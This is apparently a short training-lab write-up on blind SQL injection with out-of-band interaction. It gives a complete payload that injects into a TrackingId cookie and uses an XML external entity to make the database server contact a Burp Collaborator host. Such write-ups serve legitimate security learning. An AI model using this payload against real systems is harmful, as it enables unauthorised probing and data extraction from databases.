# Lab 14: Blind SQL Injection with Out-of-Band Interaction

* **Solution**: Use TrackingId to trigger a DNS lookup to a Burp Collaborator domain if the admin exists, confirming vulnerability.
* **Final Payload**:
  * TrackingId=xyz' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR-ID.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual) --